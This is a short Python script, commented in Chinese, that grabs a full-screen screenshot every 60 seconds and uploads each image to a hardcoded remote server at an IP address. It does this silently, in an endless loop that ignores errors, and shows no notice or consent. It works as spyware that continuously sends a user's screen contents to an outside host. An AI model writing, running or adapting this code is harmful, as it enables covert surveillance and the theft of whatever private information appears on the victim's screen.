from PIL import ImageGrab
from datetime import datetime
from io import BytesIO
from cryptography.fernet import Fernet
import threading
import sys
import requests
import traceback
import time 
if __name__ == '__main__':
    # 获取命令行参数
    # if len(sys.argv) < 2:
    #     print("请提供有效的 key 值作为命令行参数")
    #     sys.exit(1)
    # fernet = Fernet(key)
    date_format = "%Y-%m-%d-%H-%M-%S"
    while True:
        try:
            image = ImageGrab.grab()  # 获取整个屏幕的截图
            now_time = datetime.now().strftime(date_format)
            image_binary_io = BytesIO()
            image.save(image_binary_io, format='PNG')
            image_binary_io.seek(0)
            # 构建请求参数
            files = {'file': (f'{now_time}.png', image_binary_io, 'image/png')}
            # 发送 POST 请求到服务器端
            response = requests.post('http://182.92.170.91:12138/upload', files=files)
        except Exception as e:
            print(e)
        finally:
            time.sleep(60)
